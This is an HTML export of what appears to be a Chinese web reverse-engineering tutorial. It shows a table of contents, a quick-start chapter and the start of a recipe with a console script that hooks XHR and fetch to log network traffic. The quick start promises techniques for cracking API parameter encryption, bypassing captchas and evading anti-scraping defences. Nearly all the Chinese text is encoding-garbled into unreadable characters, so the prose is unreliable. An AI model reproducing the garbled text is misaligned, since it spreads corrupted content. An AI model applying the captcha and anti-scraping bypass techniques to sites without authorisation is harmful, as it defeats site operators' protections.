                    <span style="background: #e8f5e9; color: #2e7d32; padding: 1pt 5pt; border-radius: 3pt; font-size: 8pt; font-weight: 600; margin-right: 6pt;">R59</span><span style="color: #555; font-size: 9.5pt;">Automation Scripts</span>
                </div>
                
                <div class="toc-entry" style="margin-left: 30pt; margin-top: 3pt; padding: 3pt 0;">
                    <span style="background: #e8f5e9; color: #2e7d32; padding: 1pt 5pt; border-radius: 3pt; font-size: 8pt; font-weight: 600; margin-right: 6pt;">R60</span><span style="color: #555; font-size: 9.5pt;">Crypto Detection Scripts</span>
                </div>
                
                <div class="toc-part">
                    <h2 style="color: #2c3e50; font-size: 14pt; margin-top: 20pt; margin-bottom: 10pt; border-left: 4px solid #4CAF50; padding-left: 10pt;">
                        Part VIII: Reference
                    </h2>
                </div>
                
                    <div class="toc-section" style="margin-left: 15pt; margin-top: 10pt; margin-bottom: 6pt; padding: 4pt 8pt; background-color: #f5f5f5; border-radius: 4pt; border-left: 3px solid #81c784;">
                        <span style="font-weight: 600; color: #2e7d32; font-size: 10.5pt;">Cheat Sheets</span>
                    </div>
                    
                <div class="toc-entry" style="margin-left: 30pt; margin-top: 3pt; padding: 3pt 0;">
                    <span style="background: #e8f5e9; color: #2e7d32; padding: 1pt 5pt; border-radius: 3pt; font-size: 8pt; font-weight: 600; margin-right: 6pt;">R61</span><span style="color: #555; font-size: 9.5pt;">Overview</span>
                </div>
                
                <div class="toc-entry" style="margin-left: 30pt; margin-top: 3pt; padding: 3pt 0;">
                    <span style="background: #e8f5e9; color: #2e7d32; padding: 1pt 5pt; border-radius: 3pt; font-size: 8pt; font-weight: 600; margin-right: 6pt;">R62</span><span style="color: #555; font-size: 9.5pt;">Common Commands</span>
                </div>
                
                <div class="toc-entry" style="margin-left: 30pt; margin-top: 3pt; padding: 3pt 0;">
                    <span style="background: #e8f5e9; color: #2e7d32; padding: 1pt 5pt; border-radius: 3pt; font-size: 8pt; font-weight: 600; margin-right: 6pt;">R63</span><span style="color: #555; font-size: 9.5pt;">Crypto Signatures</span>
                </div>
                
                <div class="toc-entry" style="margin-left: 30pt; margin-top: 3pt; padding: 3pt 0;">
                    <span style="background: #e8f5e9; color: #2e7d32; padding: 1pt 5pt; border-radius: 3pt; font-size: 8pt; font-weight: 600; margin-right: 6pt;">R64</span><span style="color: #555; font-size: 9.5pt;">Tool Shortcuts</span>
                </div>
                
                <div class="toc-entry" style="margin-left: 30pt; margin-top: 3pt; padding: 3pt 0;">
                    <span style="background: #e8f5e9; color: #2e7d32; padding: 1pt 5pt; border-radius: 3pt; font-size: 8pt; font-weight: 600; margin-right: 6pt;">R65</span><span style="color: #555; font-size: 9.5pt;">Regex Patterns</span>
                </div>
                
                <div class="toc-entry" style="margin-left: 30pt; margin-top: 3pt; padding: 3pt 0;">
                    <span style="background: #e8f5e9; color: #2e7d32; padding: 1pt 5pt; border-radius: 3pt; font-size: 8pt; font-weight: 600; margin-right: 6pt;">R66</span><span style="color: #555; font-size: 9.5pt;">HTTP Headers</span>
                </div>
                
                    <div class="toc-section" style="margin-left: 15pt; margin-top: 10pt; margin-bottom: 6pt; padding: 4pt 8pt; background-color: #f5f5f5; border-radius: 4pt; border-left: 3px solid #81c784;">
                        <span style="font-weight: 600; color: #2e7d32; font-size: 10.5pt;">Templates</span>
                    </div>
                    
                <div class="toc-entry" style="margin-left: 30pt; margin-top: 3pt; padding: 3pt 0;">
                    <span style="background: #e8f5e9; color: #2e7d32; padding: 1pt 5pt; border-radius: 3pt; font-size: 8pt; font-weight: 600; margin-right: 6pt;">R67</span><span style="color: #555; font-size: 9.5pt;">Overview</span>
                </div>
                
                <div class="toc-entry" style="margin-left: 30pt; margin-top: 3pt; padding: 3pt 0;">
                    <span style="background: #e8f5e9; color: #2e7d32; padding: 1pt 5pt; border-radius: 3pt; font-size: 8pt; font-weight: 600; margin-right: 6pt;">R68</span><span style="color: #555; font-size: 9.5pt;">Basic Scraper</span>
                </div>
                
                <div class="toc-entry" style="margin-left: 30pt; margin-top: 3pt; padding: 3pt 0;">
                    <span style="background: #e8f5e9; color: #2e7d32; padding: 1pt 5pt; border-radius: 3pt; font-size: 8pt; font-weight: 600; margin-right: 6pt;">R69</span><span style="color: #555; font-size: 9.5pt;">Reverse Project</span>
                </div>
                
                <div class="toc-entry" style="margin-left: 30pt; margin-top: 3pt; padding: 3pt 0;">
                    <span style="background: #e8f5e9; color: #2e7d32; padding: 1pt 5pt; border-radius: 3pt; font-size: 8pt; font-weight: 600; margin-right: 6pt;">R70</span><span style="color: #555; font-size: 9.5pt;">Docker Setup</span>
                </div>
                
                <div class="toc-entry" style="margin-left: 30pt; margin-top: 3pt; padding: 3pt 0;">
                    <span style="background: #e8f5e9; color: #2e7d32; padding: 1pt 5pt; border-radius: 3pt; font-size: 8pt; font-weight: 600; margin-right: 6pt;">R71</span><span style="color: #555; font-size: 9.5pt;">CI/CD Pipeline</span>
                </div>
                
                <div class="toc-entry" style="margin-left: 30pt; margin-top: 3pt; padding: 3pt 0;">
                    <span style="background: #e8f5e9; color: #2e7d32; padding: 1pt 5pt; border-radius: 3pt; font-size: 8pt; font-weight: 600; margin-right: 6pt;">R72</span><span style="color: #555; font-size: 9.5pt;">Distributed Crawler</span>
                </div>
                
                    <div class="toc-section" style="margin-left: 15pt; margin-top: 10pt; margin-bottom: 6pt; padding: 4pt 8pt; background-color: #f5f5f5; border-radius: 4pt; border-left: 3px solid #81c784;">
                        <span style="font-weight: 600; color: #2e7d32; font-size: 10.5pt;">Troubleshooting</span>
                    </div>
                    
                <div class="toc-entry" style="margin-left: 30pt; margin-top: 3pt; padding: 3pt 0;">
                    <span style="background: #e8f5e9; color: #2e7d32; padding: 1pt 5pt; border-radius: 3pt; font-size: 8pt; font-weight: 600; margin-right: 6pt;">R73</span><span style="color: #555; font-size: 9.5pt;">Overview</span>
                </div>
                
                <div class="toc-entry" style="margin-left: 30pt; margin-top: 3pt; padding: 3pt 0;">
                    <span style="background: #e8f5e9; color: #2e7d32; padding: 1pt 5pt; border-radius: 3pt; font-size: 8pt; font-weight: 600; margin-right: 6pt;">R74</span><span style="color: #555; font-size: 9.5pt;">Network Issues</span>
                </div>
                
                <div class="toc-entry" style="margin-left: 30pt; margin-top: 3pt; padding: 3pt 0;">
                    <span style="background: #e8f5e9; color: #2e7d32; padding: 1pt 5pt; border-radius: 3pt; font-size: 8pt; font-weight: 600; margin-right: 6pt;">R75</span><span style="color: #555; font-size: 9.5pt;">Anti-Scraping Issues</span>
                </div>
                
                <div class="toc-entry" style="margin-left: 30pt; margin-top: 3pt; padding: 3pt 0;">
                    <span style="background: #e8f5e9; color: #2e7d32; padding: 1pt 5pt; border-radius: 3pt; font-size: 8pt; font-weight: 600; margin-right: 6pt;">R76</span><span style="color: #555; font-size: 9.5pt;">JavaScript Debugging</span>
                </div>
                
                <div class="toc-entry" style="margin-left: 30pt; margin-top: 3pt; padding: 3pt 0;">
                    <span style="background: #e8f5e9; color: #2e7d32; padding: 1pt 5pt; border-radius: 3pt; font-size: 8pt; font-weight: 600; margin-right: 6pt;">R77</span><span style="color: #555; font-size: 9.5pt;">Tool Issues</span>
                </div>
                
                <div class="toc-entry" style="margin-left: 30pt; margin-top: 3pt; padding: 3pt 0;">
                    <span style="background: #e8f5e9; color: #2e7d32; padding: 1pt 5pt; border-radius: 3pt; font-size: 8pt; font-weight: 600; margin-right: 6pt;">R78</span><span style="color: #555; font-size: 9.5pt;">Data Issues</span>
                </div>
                
                <div class="toc-entry" style="margin-left: 30pt; margin-top: 3pt; padding: 3pt 0;">
                    <span style="background: #e8f5e9; color: #2e7d32; padding: 1pt 5pt; border-radius: 3pt; font-size: 8pt; font-weight: 600; margin-right: 6pt;">R79</span><span style="color: #555; font-size: 9.5pt;">Docker Issues</span>
                </div>
                
                    <div class="toc-section" style="margin-left: 15pt; margin-top: 10pt; margin-bottom: 6pt; padding: 4pt 8pt; background-color: #f5f5f5; border-radius: 4pt; border-left: 3px solid #81c784;">
                        <span style="font-weight: 600; color: #2e7d32; font-size: 10.5pt;">Resources</span>
                    </div>
                    
                <div class="toc-entry" style="margin-left: 30pt; margin-top: 3pt; padding: 3pt 0;">
                    <span style="background: #e8f5e9; color: #2e7d32; padding: 1pt 5pt; border-radius: 3pt; font-size: 8pt; font-weight: 600; margin-right: 6pt;">R80</span><span style="color: #555; font-size: 9.5pt;">GitHub Projects</span>
                </div>
                
                <div class="toc-entry" style="margin-left: 30pt; margin-top: 3pt; padding: 3pt 0;">
                    <span style="background: #e8f5e9; color: #2e7d32; padding: 1pt 5pt; border-radius: 3pt; font-size: 8pt; font-weight: 600; margin-right: 6pt;">R81</span><span style="color: #555; font-size: 9.5pt;">Learning Resources</span>
                </div>
                
                <div class="toc-entry" style="margin-left: 30pt; margin-top: 3pt; padding: 3pt 0;">
                    <span style="background: #e8f5e9; color: #2e7d32; padding: 1pt 5pt; border-radius: 3pt; font-size: 8pt; font-weight: 600; margin-right: 6pt;">R82</span><span style="color: #555; font-size: 9.5pt;">FAQ</span>
                </div>
                
            <div style="margin-top: 25pt; text-align: center; color: #888; font-size: 10pt; border-top: 1px solid #ddd; padding-top: 15pt;">
                <p>Total Recipes: 82 | å…± 82 ä¸ª Recipe</p>
            </div>
        </div>
        
                    <div class="chapter">
                        <h1 class="no-page-break">Part I: Getting Started</h1>
                    
                                            <div class="section" id="section-1">
                                                <h2>[R00] Overview</h2>
                                                <h1>R00: å¿«é€Ÿå¼€å§‹ - Quick Start</h1>
<p>æ¬¢è¿æ¥åˆ° Web é€†å‘å·¥ç¨‹çƒ¹é¥ªé£Ÿè°±ï¼æœ¬ç« èŠ‚å°†å¸®åŠ©ä½ å¿«é€Ÿä¸Šæ‰‹ï¼Œé€šè¿‡å‡ ä¸ªç®€å•çš„é…æ–¹ï¼Œåœ¨æœ€çŸ­æ—¶é—´å†…æŒæ¡ Web é€†å‘çš„æ ¸å¿ƒæŠ€èƒ½ã€‚</p>
<hr />
<h2>ğŸ¯ å­¦ä¹ è·¯å¾„</h2>
<p>æˆ‘ä»¬ä¸ºä½ å‡†å¤‡äº†ä¸‰ä¸ªæ¸è¿›å¼çš„å¿«é€Ÿé…æ–¹ï¼š</p>
<h3>1ï¸âƒ£ <a href="#section-2">ä½ çš„ç¬¬ä¸€ä¸ª Hook</a></h3>
<p><strong>éš¾åº¦</strong>: â­
<strong>æ—¶é—´</strong>: 15 åˆ†é’Ÿ
<strong>å­¦ä¹ </strong>: å¦‚ä½•åœ¨æµè§ˆå™¨ä¸­æ‹¦æˆªå’Œç›‘æ§ç½‘ç»œè¯·æ±‚</p>
<p>è¿™æ˜¯ä½ çš„ç¬¬ä¸€é“èœï¼å­¦ä¼šä½¿ç”¨ JavaScript Hook æŠ€æœ¯ç›‘æ§ç½‘ç«™çš„æ‰€æœ‰ XHR å’Œ Fetch è¯·æ±‚ï¼Œäº†è§£ç½‘ç«™åœ¨èƒŒååšä»€ä¹ˆã€‚</p>
<p><strong>ä½ å°†å­¦åˆ°</strong>:</p>
<ul>
<li>æ‰“å¼€æµè§ˆå™¨å¼€å‘è€…å·¥å…·</li>
<li>æ³¨å…¥ Hook è„šæœ¬</li>
<li>æŸ¥çœ‹è¯·æ±‚å’Œå“åº”æ•°æ®</li>
<li>ç†è§£ Hook çš„å·¥ä½œåŸç†</li>
</ul>
<hr />
<h3>2ï¸âƒ£ <a href="#section-3">è§£å¯† API å‚æ•°</a></h3>
<p><strong>éš¾åº¦</strong>: â­â­
<strong>æ—¶é—´</strong>: 30 åˆ†é’Ÿ
<strong>å­¦ä¹ </strong>: å¦‚ä½•å®šä½å’Œç ´è§£åŠ å¯†çš„ API å‚æ•°</p>
<p>è¿›é˜¶é…æ–¹ï¼å­¦ä¼šè¿½è¸ªåŠ å¯†å‡½æ•°ï¼Œåˆ†æç®—æ³•ï¼Œæœ€ç»ˆç”¨ Python å¤ç°åŠ å¯†é€»è¾‘ã€‚</p>
<p><strong>ä½ å°†å­¦åˆ°</strong>:</p>
<ul>
<li>ä½¿ç”¨ XHR æ–­ç‚¹å®šä½åŠ å¯†å‡½æ•°</li>
<li>åˆ†æ JavaScript åŠ å¯†ä»£ç </li>
<li>æå–å¯†é’¥å’Œç®—æ³•</li>
<li>ç”¨ Python å®ç°ç›¸åŒçš„åŠ å¯†</li>
</ul>
<hr />
<h3>3ï¸âƒ£ <a href="#section-4">ç»•è¿‡ç®€å•éªŒè¯ç </a></h3>
<p><strong>éš¾åº¦</strong>: â­â­
<strong>æ—¶é—´</strong>: 30 åˆ†é’Ÿ
<strong>å­¦ä¹ </strong>: å¦‚ä½•åˆ†æå’Œç»•è¿‡ç®€å•çš„å›¾å½¢éªŒè¯ç </p>
<p>å®æˆ˜é…æ–¹ï¼å­¦ä¼šä½¿ç”¨ OCR æŠ€æœ¯è¯†åˆ«éªŒè¯ç ï¼Œæˆ–è€…é€šè¿‡åˆ†æå‘ç°éªŒè¯ç çš„æ¼æ´ã€‚</p>
<p><strong>ä½ å°†å­¦åˆ°</strong>:</p>
<ul>
<li>æŠ“å–éªŒè¯ç å›¾ç‰‡</li>
<li>ä½¿ç”¨ OCR è¯†åˆ«éªŒè¯ç </li>
<li>åˆ†æéªŒè¯ç ç”Ÿæˆé€»è¾‘</li>
<li>è‡ªåŠ¨åŒ–éªŒè¯ç è¯†åˆ«</li>
</ul>
<hr />
<h2>ğŸ“š å¼€å§‹ä¹‹å‰</h2>
<h3>å¿…å¤‡å·¥å…·</h3>
<p>åœ¨å¼€å§‹çƒ¹é¥ªä¹‹å‰ï¼Œè¯·ç¡®ä¿ä½ çš„å¨æˆ¿ï¼ˆå¼€å‘ç¯å¢ƒï¼‰å·²å‡†å¤‡å¥½ä»¥ä¸‹å·¥å…·ï¼š</p>
<p>âœ… <strong>æµè§ˆå™¨</strong>: Chrome æˆ– Firefoxï¼ˆæ¨è Chromeï¼‰
âœ… <strong>æ–‡æœ¬ç¼–è¾‘å™¨</strong>: VS Code æˆ–ä»»ä½•ä½ å–œæ¬¢çš„ç¼–è¾‘å™¨
âœ… <strong>Python 3.7+</strong>: ç”¨äºç¼–å†™è‡ªåŠ¨åŒ–è„šæœ¬
âœ… <strong>åŸºç¡€çŸ¥è¯†</strong>: JavaScript åŸºç¡€è¯­æ³•</p>
<h3>æ¨èå®‰è£…</h3>
<p>ä»¥ä¸‹å·¥å…·å°†åœ¨åç»­é…æ–¹ä¸­ç”¨åˆ°ï¼š</p>
<pre><code class="language-bash"># Python ä¾èµ–
pip install requests beautifulsoup4 pillow pytesseract

# Node.js å·¥å…·ï¼ˆå¯é€‰ï¼‰
npm install -g @babel/cli @babel/core
</code></pre>
<hr />
<h2>ğŸ“ å­¦ä¹ å»ºè®®</h2>
<h3>å¯¹äºå®Œå…¨æ–°æ‰‹</h3>
<ol>
<li><strong>æŒ‰é¡ºåºå­¦ä¹ </strong>: ä»ç¬¬ä¸€ä¸ªé…æ–¹å¼€å§‹ï¼Œä¸è¦è·³è¿‡</li>
<li><strong>åŠ¨æ‰‹å®è·µ</strong>: æ¯ä¸ªé…æ–¹éƒ½è¦äº²è‡ªæ“ä½œä¸€é</li>
<li><strong>ä¸è¦ç€æ€¥</strong>: ç†è§£åŸç†æ¯”å¿«é€Ÿå®Œæˆæ›´é‡è¦</li>
<li><strong>è®°å½•ç¬”è®°</strong>: è®°ä¸‹ä½ çš„å‘ç°å’Œç–‘é—®</li>
</ol>
<h3>å¯¹äºæœ‰åŸºç¡€çš„å­¦ä¹ è€…</h3>
<ul>
<li>ä½ å¯ä»¥ç›´æ¥è·³åˆ°æ„Ÿå…´è¶£çš„é…æ–¹</li>
<li>å°è¯•ä¿®æ”¹é…æ–¹å‚æ•°ï¼Œæ¢ç´¢ä¸åŒæ•ˆæœ</li>
<li>å°è¯•å°†å­¦åˆ°çš„æŠ€æœ¯åº”ç”¨åˆ°å®é™…ç½‘ç«™</li>
</ul>
<hr />
<h2>ğŸ’¡ å¦‚ä½•ä½¿ç”¨è¿™äº›é…æ–¹</h2>
<p>æ¯ä¸ªé…æ–¹éƒ½é‡‡ç”¨ç»Ÿä¸€çš„ç»“æ„ï¼š</p>
<pre><code>ğŸ“Š é…æ–¹ä¿¡æ¯
â”œâ”€â”€ éš¾åº¦ (â­-â­â­â­â­â­)
â”œâ”€â”€ é¢„è®¡æ—¶é—´
â””â”€â”€ æ‰€éœ€å·¥å…·

ğŸ¯ ä½ å°†å­¦åˆ°
â”œâ”€â”€ æŠ€èƒ½ç‚¹1
â”œâ”€â”€ æŠ€èƒ½ç‚¹2
â””â”€â”€ æŠ€èƒ½ç‚¹3

ğŸ“ å‡†å¤‡å·¥ä½œ
â””â”€â”€ å‰ç½®æ¡ä»¶æ¸…å•

ğŸš€ æ­¥éª¤
â”œâ”€â”€ Step 1
â”œâ”€â”€ Step 2
â””â”€â”€ Step 3

âœ… éªŒè¯æ¸…å•
â””â”€â”€ å¦‚ä½•ç¡®è®¤æˆåŠŸ

â— å¸¸è§é—®é¢˜
â””â”€â”€ FAQ
</code></pre>
<hr />
<h2>ğŸ”¥ å¸¸è§é—®é¢˜</h2>
<h3>Q: æˆ‘éœ€è¦å¤šå°‘ç¼–ç¨‹åŸºç¡€ï¼Ÿ</h3>
<p><strong>A</strong>: åŸºç¡€çš„ JavaScript è¯­æ³•çŸ¥è¯†å³å¯ã€‚å¦‚æœä½ ä¼šï¼š</p>
<ul>
<li>å˜é‡ã€å‡½æ•°ã€å¯¹è±¡</li>
<li>if/else æ¡ä»¶åˆ¤æ–­</li>
<li>åŸºæœ¬çš„è°ƒè¯•æŠ€å·§</li>
</ul>
<p>é‚£ä½ å°±å¯ä»¥å¼€å§‹äº†ï¼ä¸æ‡‚çš„åœ°æ–¹å¯ä»¥å‚è€ƒ <a href="#section-7">JavaScript åŸºç¡€</a>ã€‚</p>
<h3>Q: è¿™äº›æŠ€æœ¯æ˜¯å¦åˆæ³•ï¼Ÿ</h3>
<p><strong>A</strong>: Web é€†å‘æŠ€æœ¯æœ¬èº«æ˜¯ä¸­ç«‹çš„å·¥å…·ã€‚è¯·éµå®ˆï¼š</p>
<ul>
<li>âœ… ç”¨äºå­¦ä¹ å’Œç ”ç©¶</li>
<li>âœ… ç”¨äºæˆæƒçš„å®‰å…¨æµ‹è¯•</li>
<li>âœ… éµå®ˆç½‘ç«™çš„æœåŠ¡æ¡æ¬¾</li>
<li>âŒ ä¸è¦ç”¨äºéæ³•ç›®çš„</li>
<li>âŒ ä¸è¦ç”¨äºå•†ä¸šçˆ¬è™«ï¼ˆæœªç»æˆæƒï¼‰</li>
</ul>
<h3>Q: å®Œæˆè¿™ä¸‰ä¸ªé…æ–¹åæˆ‘èƒ½åšä»€ä¹ˆï¼Ÿ</h3>
<p><strong>A</strong>: ä½ å°†èƒ½å¤Ÿï¼š</p>
<ul>
<li>åˆ†æå¤§éƒ¨åˆ†ç½‘ç«™çš„è¯·æ±‚æœºåˆ¶</li>
<li>ç ´è§£ç®€å•åˆ°ä¸­ç­‰éš¾åº¦çš„åŠ å¯†</li>
<li>ç»•è¿‡åŸºç¡€çš„åçˆ¬è™«æªæ–½</li>
<li>ç»§ç»­å­¦ä¹ æ›´é«˜çº§çš„é…æ–¹</li>
</ul>
<hr />
<h2>ğŸš€ å‡†å¤‡å¥½äº†å—ï¼Ÿ</h2>
<p>é€‰æ‹©ä½ çš„ç¬¬ä¸€ä¸ªé…æ–¹ï¼š</p>
<ol>
<li>ğŸ£ <a href="#section-2">ä½ çš„ç¬¬ä¸€ä¸ª Hook</a> - æ¨èä»è¿™é‡Œå¼€å§‹</li>
<li>ğŸ” <a href="#section-3">è§£å¯† API å‚æ•°</a></li>
<li>ğŸ¤– <a href="#section-4">ç»•è¿‡ç®€å•éªŒè¯ç </a></li>
</ol>
<hr />
<h2>ğŸ“– ç›¸å…³ç« èŠ‚</h2>
<p>å®Œæˆå¿«é€Ÿå…¥é—¨åï¼Œä½ å¯ä»¥ç»§ç»­æ·±å…¥å­¦ä¹ ï¼š</p>
<ul>
<li><a href="../03-Basic-Recipes/">åŸºç¡€é…æ–¹</a> - æ ¸å¿ƒæŠ€æœ¯è¯¦è§£</li>
<li><a href="../04-Advanced-Recipes/">é«˜çº§é…æ–¹</a> - é«˜çº§æŠ€æœ¯æŒ‘æˆ˜</li>
<li><a href="../05-Case-Studies/">æ¡ˆä¾‹ç ”ç©¶</a> - çœŸå®ç½‘ç«™åˆ†æ</li>
</ul>
<hr />
<p><strong>Happy Cooking!</strong> ğŸ‰</p>
<p>è®©æˆ‘ä»¬å¼€å§‹ä½ çš„ Web é€†å‘å·¥ç¨‹ä¹‹æ—…å§ï¼</p>

                                            </div>
                                            
                                            <div class="section" id="section-2">
                                                <h2>[R01] Your First Hook</h2>
                                                <h1>R01: é…æ–¹ï¼šä½ çš„ç¬¬ä¸€ä¸ª Hook</h1>
<h2>ğŸ“Š é…æ–¹ä¿¡æ¯</h2>
<table>
<thead>
<tr>
  <th>é¡¹ç›®</th>
  <th>è¯´æ˜</th>
</tr>
</thead>
<tbody>
<tr>
  <td><strong>éš¾åº¦</strong></td>
  <td>â­ (å…¥é—¨çº§)</td>
</tr>
<tr>
  <td><strong>é¢„è®¡æ—¶é—´</strong></td>
  <td>15 åˆ†é’Ÿ</td>
</tr>
<tr>
  <td><strong>æ‰€éœ€å·¥å…·</strong></td>
  <td>Chrome æµè§ˆå™¨</td>
</tr>
<tr>
  <td><strong>é€‚ç”¨åœºæ™¯</strong></td>
  <td>ç›‘æ§ç½‘ç«™çš„æ‰€æœ‰ç½‘ç»œè¯·æ±‚</td>
</tr>
<tr>
  <td><strong>å‰ç½®çŸ¥è¯†</strong></td>
  <td>æ— éœ€ç¼–ç¨‹åŸºç¡€</td>
</tr>
</tbody>
</table>
<hr />
<h2>ğŸ¯ ä½ å°†å­¦åˆ°</h2>
<p>å®Œæˆè¿™ä¸ªé…æ–¹åï¼Œä½ å°†èƒ½å¤Ÿï¼š</p>
<ul>
<li>âœ… æ‰“å¼€å’Œä½¿ç”¨æµè§ˆå™¨å¼€å‘è€…å·¥å…·</li>
<li>âœ… åœ¨æµè§ˆå™¨ä¸­æ³¨å…¥ JavaScript ä»£ç </li>
<li>âœ… æ‹¦æˆªå’ŒæŸ¥çœ‹æ‰€æœ‰ XHR/Fetch è¯·æ±‚</li>
<li>âœ… ç†è§£ Hook æŠ€æœ¯çš„åŸºæœ¬åŸç†</li>
<li>âœ… å¯¼å‡ºå’Œä¿å­˜æ‹¦æˆªåˆ°çš„æ•°æ®</li>
</ul>
<hr />
<h2>ğŸ“ å‡†å¤‡å·¥ä½œ</h2>
<h3>æ£€æŸ¥æ¸…å•</h3>
<p>åœ¨å¼€å§‹ä¹‹å‰ï¼Œè¯·ç¡®è®¤ï¼š</p>
<ul>
<li>â˜ å·²å®‰è£… Chrome æµè§ˆå™¨ï¼ˆæˆ– Edge/Firefoxï¼‰</li>
<li>â˜ èƒ½å¤Ÿè®¿é—®äº’è”ç½‘</li>
<li>â˜ å‡†å¤‡ä¸€ä¸ªç›®æ ‡ç½‘ç«™ï¼ˆæ¨èç”¨ <a href="https://jsonplaceholder.typicode.com/">https://jsonplaceholder.typicode.com/</a> ä½œä¸ºç»ƒä¹ ï¼‰</li>
</ul>
<h3>èƒŒæ™¯çŸ¥è¯†</h3>
<p><strong>ä»€ä¹ˆæ˜¯ Hookï¼Ÿ</strong></p>
<p>Hookï¼ˆé’©å­ï¼‰å°±åƒåœ¨æ•°æ®æµåŠ¨çš„ç®¡é“ä¸Šå®‰è£…ä¸€ä¸ª&quot;ç›‘å¬å™¨&quot;ï¼Œå¯ä»¥ï¼š</p>
<ul>
<li>æŸ¥çœ‹é€šè¿‡ç®¡é“çš„æ‰€æœ‰æ•°æ®</li>
<li>ä¿®æ”¹æ•°æ®å†…å®¹</li>
<li>è®°å½•æ•°æ®ç”¨äºåˆ†æ</li>
</ul>
<p>åœ¨ Web é€†å‘ä¸­ï¼Œæˆ‘ä»¬ä¸»è¦ Hook ç½‘ç»œè¯·æ±‚å‡½æ•°ï¼Œç›‘æ§ç½‘ç«™å‘é€å’Œæ¥æ”¶çš„æ•°æ®ã€‚</p>
<hr />
<h2>ğŸš€ æ­¥éª¤è¯¦è§£</h2>
<h3>Step 1: æ‰“å¼€å¼€å‘è€…å·¥å…·</h3>
<ol>
<li><p><strong>æ‰“å¼€ Chrome æµè§ˆå™¨</strong></p>
</li>
<li><p><strong>è®¿é—®æµ‹è¯•ç½‘ç«™</strong>:</p>
<pre><code>https://jsonplaceholder.typicode.com/
</code></pre>
</li>
<li><p><strong>æ‰“å¼€å¼€å‘è€…å·¥å…·</strong>ï¼ˆä¸‰ç§æ–¹å¼ä»»é€‰å…¶ä¸€ï¼‰:</p>
<ul>
<li>æŒ‰ <code>F12</code> é”®</li>
<li>æŒ‰ <code>Ctrl+Shift+I</code> (Windows) æˆ– <code>Cmd+Option+I</code> (Mac)</li>
<li>å³é”®é¡µé¢ â†’ &quot;æ£€æŸ¥&quot;</li>
</ul>
</li>
<li><p><strong>åˆ‡æ¢åˆ° Console æ ‡ç­¾</strong></p>
</li>
</ol>
<p><img src="https://via.placeholder.com/800x400?text=DevTools+Console" alt="å¼€å‘è€…å·¥å…·ç•Œé¢" /></p>
<p>âœ… <strong>éªŒè¯</strong>: ä½ åº”è¯¥çœ‹åˆ°ä¸€ä¸ªå¯ä»¥è¾“å…¥ä»£ç çš„æ§åˆ¶å°ç•Œé¢</p>
<hr />
<h3>Step 2: æ³¨å…¥ Hook ä»£ç </h3>
<ol>
<li><strong>å¤åˆ¶ä»¥ä¸‹ä»£ç </strong>:</li>
</ol>
<pre><code class="language-javascript">// ğŸ£ Universal Network Monitor Hook
(function () {
  console.log(&quot;ğŸ£ Network Hookå·²å¯åŠ¨ï¼&quot;);

  // Hook XMLHttpRequest
  const originalXHROpen = XMLHttpRequest.prototype.open;
  const originalXHRSend = XMLHttpRequest.prototype.send;

  XMLHttpRequest.prototype.open = function (method, url) {
    this._method = method;
    this._url = url;
    return originalXHROpen.apply(this, arguments);
  };

  XMLHttpRequest.prototype.send = function (body) {
    console.log(&quot;ğŸ“¤ [XHR è¯·æ±‚]&quot;, {
      method: this._method,
      url: this._url,
      body: body,
    });

    // Hook å“åº”
    this.addEventListener(&quot;load&quot;, function () {
      console.log(&quot;ğŸ“¥ [XHR å“åº”]&quot;, {
        url: this._url,
        status: this.status,
        response: this.responseText.substring(0, 200) + &quot;...&quot;,
      });
    });

    return originalXHRSend.apply(this, arguments);
  };

  // Hook Fetch API
  const originalFetch = window.fetch;
  window.fetch = function (...args) {
    console.log(&quot;ğŸ“¤ [Fetch è¯·æ±‚]&quot;, {
      url: args[0],
      options: args[1],
    });

    return originalFetch.apply(this, args).then((response) =&gt; {
      console.log(&quot;ğŸ“¥ [Fetch å“åº”]&quot;, {
        url: response.url,
        status: response.status,
      });

      // Clone response é¿å…æ¶ˆè€—å®ƒ
      return response
        .clone()
        .text()
        .then((body) =&gt; {
          console.log(&quot;ğŸ“¥ [Fetch å†…å®¹]&quot;, body.substring(0, 200) + &quot;...&quot;);
          return response;
        });
    });
  };

  console.log(&quot;âœ… Hook å®‰è£…æˆåŠŸï¼ç°åœ¨æ‰€æœ‰è¯·æ±‚éƒ½ä¼šè¢«è®°å½•ã€‚&quot;);
})();
</code></pre>
<ol start="2">
<li><p><strong>ç²˜è´´åˆ° Console ä¸­</strong></p>
</li>
<li><p><strong>æŒ‰ Enter é”®æ‰§è¡Œ</strong></p>
</li>
</ol>
<p>âœ… <strong>éªŒè¯</strong>: ä½ åº”è¯¥çœ‹åˆ°æ¶ˆæ¯ &quot;âœ… Hook å®‰è£…æˆåŠŸï¼ç°åœ¨æ‰€æœ‰è¯·æ±‚éƒ½ä¼šè¢«è®°å½•ã€‚&quot;</p>
<hr />
<h3>Step 3: è§¦å‘è¯·æ±‚å¹¶è§‚å¯Ÿ</h3>
<ol>
<li><p><strong>åœ¨æµ‹è¯•ç½‘ç«™ä¸­ç‚¹å‡»ç¤ºä¾‹é“¾æ¥</strong>:</p>
<ul>
<li>ç‚¹å‡» <code>/posts</code></li>
<li>ç‚¹å‡» <code>/comments</code></li>
<li>ç‚¹å‡» <code>/users</code></li>
</ul>
</li>
<li><p><strong>è§‚å¯Ÿ Console è¾“å‡º</strong>:</p>
</li>
</ol>
<p>ä½ ä¼šçœ‹åˆ°ç±»ä¼¼è¿™æ ·çš„è¾“å‡ºï¼š</p>
<pre><code>ğŸ“¤ [Fetch è¯·æ±‚] {url: &quot;https://jsonplaceholder.typicode.com/posts&quot;, options: undefined}
ğŸ“¥ [Fetch å“åº”] {url: &quot;https://jsonplaceholder.typicode.com/posts&quot;, status: 200}
ğŸ“¥ [Fetch å†…å®¹] [{&quot;userId&quot;:1,&quot;id&quot;:1,&quot;title&quot;:&quot;sunt aut facere...
</code></pre>
<ol start="3">
<li><strong>åˆ†æè¾“å‡ºä¿¡æ¯</strong>:<ul>
<li>ğŸ“¤ è¡¨ç¤ºå‘é€çš„è¯·æ±‚</li>
<li>ğŸ“¥ è¡¨ç¤ºæ”¶åˆ°çš„å“åº”</li>
<li>å¯ä»¥çœ‹åˆ° URLã€HTTP æ–¹æ³•ã€çŠ¶æ€ç ã€å“åº”å†…å®¹</li>
</ul>
</li>
</ol>
<p>âœ… <strong>éªŒè¯</strong>: æ¯æ¬¡ç‚¹å‡»é“¾æ¥éƒ½èƒ½åœ¨ Console çœ‹åˆ°è¯·æ±‚å’Œå“åº”è®°å½•</p>
<hr />
<h3>Step 4: ä¿å­˜å’Œå¯¼å‡ºæ•°æ®</h3>
<ol>
<li><strong>å³é”® Console è¾“å‡º</strong></li>
